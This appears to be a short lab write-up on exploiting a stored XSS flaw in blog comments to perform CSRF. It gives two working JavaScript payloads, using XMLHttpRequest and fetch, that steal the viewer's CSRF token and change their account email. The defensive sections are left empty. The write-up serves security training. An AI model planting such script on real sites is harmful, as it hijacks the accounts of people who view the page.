## Exploiting XSS to perform CSRF

### Objective:
- This lab contains a stored XSS vulnerability in the blog comments function. 
- To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
- You can log in to your own account using the following credentials: `wiener:peter`

### Security Weakness:

### Exploitation Methodology:

```js
<script> 
var req = new XMLHttpRequest(); 
req.onload = handleResponse; 
req.open('get','/my-account',true); 
req.send(); 
function handleResponse() { 
	var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; 
	var changeReq = new XMLHttpRequest(); 
	changeReq.open('post', '/my-account/change-email', true); 
	changeReq.send('csrf='+token+'&email=test@test.com') 
}; 
</script>
```


Also, check if I can use **`fetch`** method. 
```JavaScript
fetch('/my-account')
  .then(response => response.text())
  .then(html => {
    const token = html.match(/name="csrf" value="(\w+)"/)[1];
    return fetch('/my-account/change-email', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: `csrf=${token}&email=test@test.com`
    });
  });
```
### Insecure Code:

### Secure Code:


